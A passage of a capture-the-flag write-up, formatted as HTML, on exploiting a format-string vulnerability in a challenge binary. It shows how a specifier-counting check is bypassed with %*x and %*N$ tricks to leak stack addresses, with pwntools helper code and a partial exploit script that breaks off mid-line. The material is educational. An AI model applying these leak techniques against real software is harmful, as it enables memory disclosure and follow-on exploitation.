</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">argcnt</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="int verify_fmt(const char *fmt, size_t n_args) {  size_t argcnt = 0;  size_t len = strlen(fmt);  for (size_t i = 0; i < len; i++) {    if (fmt[i] == '%') {      if (fmt[i+1] == '%') {        i++;        continue;      }      if (isdigit(fmt[i+1])) {        puts(&#34;[-] Positional argument not supported&#34;);        return 1;      }      if (argcnt >= n_args) {        printf(&#34;[-] Cannot use more than %lu specifiers\n&#34;, n_args);        return 1;      }      argcnt++;    }  }  return 0;}"><div></div></button></div></figure></div>
<p>The <code>verify_fmt()</code> function loops over our input string and it counts the number of <code>%</code> not followed by <code>%</code>. Also, it checks if the character immediately after <code>%</code> is a digit and if it is then, it returns <code>1</code> because positional arguments (<code>%N$p</code> where <code>N</code> is the position) are not allowed. One more thing that <code>verify_fmt()</code> does is that it checks on each loop if <code>argcnt &gt;= n_args</code> (where argcnt is the count of how many times <code>%</code> occurs) and if it is then it returns <code>1</code>.</p>
<p>So, there are a few things we can draw from this which are:</p>
<ol>
<li>We can’t use format strings like <code>%9$lx</code>/<code>%9$lx</code> (where 9 represents any number N) because of this check: <code>isdigit(fmt[i+1])</code>.</li>
<li>We can’t specify more format strings then the number of arguments specified.</li>
</ol>
<h3 id="exploitation">Exploitation</h3>
<p>The problem with exploiting this format string bug is that we don’t have leaks which we can use and the way the program is written makes it really hard to get leaks in the normal ways i.e by spamming <code>%p.%p.%p.%p ... %p</code> because we can’t specify more format strings then the number of arguments and neither can we use <code>%N$p</code> to leak stack values cause of <code>isdigit(fmt[i+1])</code> check where <code>fmt[i]</code> is <code>%</code>.</p>
<p>There are multiple ways you can bypass this check:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:30ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#616972;--1:#99A0A6"># of args: 4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[0]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[1]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[2]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">3</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[3]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Format</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">string:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%</span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%</span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%</span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%lx</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">2</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">7ffcf4671568</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ./challargs[0]: 1args[1]: 2args[2]: 3args[3]: 4Format string: %*x %*x %*x %lx2   4 1000 7ffcf4671568"><div></div></button></div></figure></div>
<p>The above example works because <code>%*x</code> format specifier consumes two arguments: the first as width and the second as the value to print. The first <code>%*x</code> consumes <code>args[0]=1</code> (width) and prints <code>args[1]=2</code>, the second <code>%*x</code> consumes <code>args[2]=3</code> (width) and prints <code>args[3]=4</code>, and the third <code>%*x</code> consumes uninitialized stack values beyond our arguments. By carefully positioning format specifiers to exhaust our controlled arguments, we reach uninitialized stack memory where a final <code>%lx</code> prints <code>0x7ffcf4671568</code>—a stack address leak.</p>
<p>Also, there is one method where you can use the value at any arbitrary position as a width specifier (<code>%*N$x</code>) and from the number of spaces printed you can deduce the value, but this would be impractical as a normal stack leak would print trillions of spaces. The same goes for precision where we could use <code>%.*N$x</code>.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:99ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#616972;--1:#99A0A6"># of args: 4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[0]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[1]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[2]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">99</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[3]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Format</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">string:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%</span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">3</span><span style="--0:#24292E;--1:#E1E4E8">$lx</span></div></div><div class="ec-line" style="--ecIndent:98ch"><div class="code"><span class="indent">                                                                                                  </span><span style="--0:#6F42C1;--1:#B392F0">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#616972;--1:#99A0A6"># of args: 4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[0]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[1]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[2]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">99</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[3]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Format</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">string:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%.</span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">3</span><span style="--0:#24292E;--1:#E1E4E8">$lx</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ./challargs[0]: 1args[1]: 1args[2]: 99args[3]: 1Format string: %*3$lx                                                                                                  1args[0]: 1args[1]: 1args[2]: 99args[3]: 1Format string: %.*3$lx000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001"><div></div></button></div></figure></div>
<p>In the first example, 99 spaces are printed because the value at position 3 on the stack is 99. In the second example, 99 zeros are printed for the same reason. While this technique is possible, it’s completely impractical for leaking actual stack addresses that would result in billions or trillions of characters being printed.</p>
<p>While there are multiple solutions to this problem, the one I ended up using leaks the lower 32 bits at any arbitrary position using partial format strings like %*N$. Since only one nibble varies in the upper 32 bits of stack addresses (1/16 chance), we can reliably reconstruct full 64-bit addresses from the partial leak.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:19ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#616972;--1:#99A0A6"># of args: 4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[0]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[1]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[2]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">3</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">args[3]:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Format</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">string:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">%</span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">6</span><span style="--0:#24292E;--1:#E1E4E8">$</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">%4096</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ./challargs[0]: 1args[1]: 2args[2]: 3args[3]: 4Format string: %*6$%4096"><div></div></button></div></figure></div>
<p>Let’s write a few helper functions:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:71ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">send</span><span style="--0:#24292E;--1:#E1E4E8">(arguments, fmt):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">str</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(arguments)).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(arguments)):</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">i</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">]: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode(), </span><span style="--0:#005CC5;--1:#79B8FF">str</span><span style="--0:#24292E;--1:#E1E4E8">(arguments[i]).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;string: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, fmt)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="def send(arguments, fmt):    io.sendlineafter(b&#34;# of args: &#34;, str(len(arguments)).encode())    for i in range(len(arguments)):      io.sendlineafter(f&#34;[{i}]: &#34;.encode(), str(arguments[i]).encode())    io.sendlineafter(b&#34;string: &#34;, fmt)"><div></div></button></div></figure></div>
<p><code>send()</code> takes a array of arguments and a string and it automates sending the program the arguments and our fmt string.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:82ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">for i in range(10):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">send(</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">[1, 2, 3, 4],</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">f&quot;|%*{(i*4)}$||%*{(i*4)+1}$||%*{(i*4)+2}$||%*{(i*4)+3}$&quot;.encode()</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">io.recvuntil(b&quot;|&quot;)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">for pos, val in enumerate(io.recvline().split(b&#39;\n&#39;)[0].decode().split(&quot;||&quot;)):</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">if &#39;$&#39; in val: continue</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">print(val[1:])</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">print(f&quot;{(i*4)+pos}: {int(val[1:]) &amp; 0xFFFFFFFF}&quot;)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="for i in range(10):    send(        [1, 2, 3, 4],        f&#34;|%*{(i*4)}$||%*{(i*4)+1}$||%*{(i*4)+2}$||%*{(i*4)+3}$&#34;.encode()    )    io.recvuntil(b&#34;|&#34;)    for pos, val in enumerate(io.recvline().split(b'\n')[0].decode().split(&#34;||&#34;)):        if '$' in val: continue        print(val[1:])        print(f&#34;{(i*4)+pos}: {int(val[1:]) &#38; 0xFFFFFFFF}&#34;)"><div></div></button></div></figure></div>
<p>The above snippet probes the stack by sending <code>%*N$</code> format strings at increasing positions and printing the results so we can identify which offsets contain useful leaks.</p>
<p>Running the script we can identify that the position 7 looks like part of a stack leak.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:101ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> context.binary </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(args.</span><span style="--0:#005CC5;--1:#79B8FF">EXE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">or</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;./chall&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(exe.libc.path)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">send</span><span style="--0:#24292E;--1:#E1E4E8">(arguments, fmt):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">str</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(arguments)).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(arguments)): io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">i</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">]: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode(), </span><span style="--0:#005CC5;--1:#79B8FF">str</span><span style="--0:#24292E;--1:#E1E4E8">(arguments[i]).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;string: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, fmt)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> process()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">10</span><span style="--0:#24292E;--1:#E1E4E8">):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">send(</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">],</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;|%*</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">$||%*</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">1}</span><span style="--0:#032F62;--1:#9ECBFF">$||%*</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">2}</span><span style="--0:#032F62;--1:#9ECBFF">$||%*</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">3}</span><span style="--0:#032F62;--1:#9ECBFF">$&quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode()</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.recvuntil(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;|&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> pos, val </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">enumerate</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().split(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">].decode().split(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;||&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)):</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> 